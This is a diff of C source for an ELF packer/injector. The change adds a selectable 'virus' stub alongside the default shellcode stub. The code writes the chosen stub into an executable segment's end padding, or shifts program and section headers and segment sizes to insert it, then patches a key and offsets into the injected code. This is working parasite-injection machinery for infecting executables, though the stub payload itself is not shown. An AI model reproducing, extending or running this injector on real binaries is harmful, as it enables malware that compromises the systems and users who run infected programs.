@@ -1,12 +1,13 @@
 #include "ww.h"
 #include "stub.h"
+#include "stub_virus.h"
 
 // This function is responsible for adjusting various offsets and sizes
 // in the program headers, and section headers after inserting the stub code.
 void ww_shift_offsets_for_stub_insertion(
-	Elf64_Ehdr *elf_header, Elf64_Off injection_offset)
+	Elf64_Ehdr *elf_header, Elf64_Off injection_offset, size_t sizeof_stub)
 {
-	size_t stub_size_with_pad = ((sizeof(g_stub) / WW_PAGE_SIZE) + 1) * WW_PAGE_SIZE;
+	size_t stub_size_with_pad = (sizeof_stub / WW_PAGE_SIZE + 1) * WW_PAGE_SIZE;
 
 	// First, shift the program headers
 	Elf64_Phdr	*program_header = (Elf64_Phdr *)(g_mapped_data + elf_header->e_phoff);
@@ -28,9 +29,10 @@ void ww_shift_offsets_for_stub_insertion(
 		elf_header->e_shoff += stub_size_with_pad;
 }
 
-void ww_generate_new_file_with_parasite(Elf64_Off injection_offset)
+void ww_generate_new_file_with_parasite(Elf64_Off injection_offset, size_t sizeof_stub)
 {
-	size_t	stub_size_with_pad = ((sizeof(g_stub) / WW_PAGE_SIZE) + 1) * WW_PAGE_SIZE;
+
+	size_t	stub_size_with_pad = (sizeof_stub / WW_PAGE_SIZE + 1) * WW_PAGE_SIZE;
 	// Create a new file that can receive the mapped data + stub with padding
 	void *file_with_stub = malloc(g_file_size + stub_size_with_pad);
 	if (!file_with_stub) ww_print_error_and_exit(WW_ERR_ALLOCMEM);
@@ -43,7 +45,11 @@ void ww_generate_new_file_with_parasite(Elf64_Off injection_offset)
 		g_mapped_data + injection_offset,
 		g_file_size - injection_offset);
 	// Copy the stub with the padding
-	ww_memcpy(file_with_stub + injection_offset, g_stub, sizeof(g_stub));
+	ww_memcpy(
+		file_with_stub + injection_offset,
+		g_modes & WW_SHELLCODE_DEFAULT ? g_stub : g_stub_virus,
+		sizeof_stub
+		);
 	// Unmap the file from memory
 	if (munmap(g_mapped_data, g_file_size) < 0) ww_print_error_and_exit(WW_ERR_MUNMAP);
 	// Link the new file to the global variable
@@ -51,41 +57,48 @@ void ww_generate_new_file_with_parasite(Elf64_Off injection_offset)
 	g_file_size += stub_size_with_pad;
 }
 
-void ww_patch_stub(char *key, const ww_t_patch *patch, Elf64_Off injection_offset)
+void ww_patch_stub(char *key, const ww_t_patch *patch, Elf64_Off injection_offset, size_t sizeof_stub)
 {
 	// Get the offset of the patch injection location in the stub
 	Elf64_Off	patch_offset =
-		injection_offset + (sizeof(g_stub) - (sizeof(ww_t_patch) + WW_KEYSTRENGTH + 1));
+		injection_offset + (sizeof_stub - (sizeof(ww_t_patch) + WW_KEYSTRENGTH + 1));
 	// Patch the stub with the actual computed data
 	ww_memcpy(g_mapped_data + patch_offset, patch, sizeof(ww_t_patch));
 	// Get the offset of the patch injection location in the stub
 	Elf64_Off	patch_key_offset =
-		injection_offset + sizeof(g_stub) - WW_KEYSTRENGTH - 1;
+		injection_offset + sizeof_stub - WW_KEYSTRENGTH - 1;
 	// Patch the stub with the actual computed data
 	ww_memcpy(g_mapped_data + patch_key_offset, key, WW_KEYSTRENGTH);
 }
 
-void ww_padding_injection(Elf64_Off injection_offset)
+void ww_padding_injection(Elf64_Off injection_offset, size_t sizeof_stub)
 {
 	if (g_modes & WW_VERBOSE)
 		printf(WW_GREEN_COLOR "The shellcode is injected into the executable "
 			   "segment's padding.\n" WW_RESET_COLOR);
 	g_modes |= WW_INJECTREG_PADDING;
-	ww_memcpy(g_mapped_data + injection_offset, g_stub, sizeof(g_stub));
+	ww_memcpy(
+		g_mapped_data + injection_offset,
+		g_modes & WW_SHELLCODE_DEFAULT ? g_stub : g_stub_virus,
+		sizeof_stub
+		);
 }
 
-void ww_shifting_injection(Elf64_Ehdr *elf_header, Elf64_Off injection_offset)
+void ww_shifting_injection(Elf64_Ehdr *elf_header, Elf64_Off injection_offset, size_t sizeof_stub)
 {
 	if (g_modes & WW_VERBOSE)
 		printf(WW_GREEN_COLOR "The executable segment's padding size is smaller than the code "
 			   "to be injected.\nThe shellcode will be injected anyway and all data"
 			   " following the injection point will be shifted.\n" WW_RESET_COLOR);
-	ww_shift_offsets_for_stub_insertion(elf_header, injection_offset);
-	ww_generate_new_file_with_parasite(injection_offset);
+	ww_shift_offsets_for_stub_insertion(elf_header, injection_offset, sizeof_stub);
+	ww_generate_new_file_with_parasite(injection_offset, sizeof_stub);
 }
 
 void ww_inject_stub(Elf64_Ehdr *elf_header, Elf64_Phdr *program_header, char *key)
 {
+	size_t		sizeof_stub = g_modes & WW_SHELLCODE_DEFAULT ? sizeof(g_stub) : sizeof(g_stub_virus);
+	printf("sizzez: %ld\n", sizeof_stub);
+
 	/* The injection offset is the sum of the executable LOAD segment's offset
 	 *  and the file size of that segment, which equals to the end of that segment.
 	 *
@@ -154,7 +167,7 @@ void ww_inject_stub(Elf64_Ehdr *elf_header, Elf64_Phdr *program_header, char *ke
 		printf("All values are expressed in hexadecimals\n\n");
 		printf("filesize:\t\t%lx\n", g_file_size);
 		printf("padding size:\t\t%x\n", padding_size);
-		printf("stub size:\t\t%lx\n\n", sizeof(g_stub));
+		printf("stub size:\t\t%lx\n\n", sizeof_stub);
 
 		printf("program_header\n");
 		printf("\tp_vaddr:\t%lx\n", program_header->p_vaddr);
@@ -180,18 +193,18 @@ void ww_inject_stub(Elf64_Ehdr *elf_header, Elf64_Phdr *program_header, char *ke
 	// If padding injection has been selected, or default option is selected 
 	if (g_modes & WW_INJECTREG_PADDING) {
 		// Insert the stub inside the executable segment's end padding if there is sufficient space
-		if ((Elf64_Off)sizeof(g_stub) <= (Elf64_Off)padding_size)
-			ww_padding_injection(injection_offset);
+		if ((Elf64_Off)sizeof_stub <= (Elf64_Off)padding_size)
+			ww_padding_injection(injection_offset, sizeof_stub);
 		// Otherwise, throw an error and quit
 		else ww_print_error_and_exit(WW_ERR_CANNOTINJECTPADDING);
 	} 
 	else {// Inject at the end of the .text segment, then shift all the data coming after
 		// Update the current phdr size that contains the stub
-		program_header->p_filesz += sizeof(g_stub);
-		program_header->p_memsz += sizeof(g_stub);
-		ww_shifting_injection(elf_header, injection_offset);
+		program_header->p_filesz += sizeof_stub;
+		program_header->p_memsz += sizeof_stub;
+		ww_shifting_injection(elf_header, injection_offset, sizeof_stub);
 	}
 	// Insert patch inside the stub
-	ww_patch_stub(key, &patch, injection_offset);
+	ww_patch_stub(key, &patch, injection_offset, sizeof_stub);
 	free(key);
 }
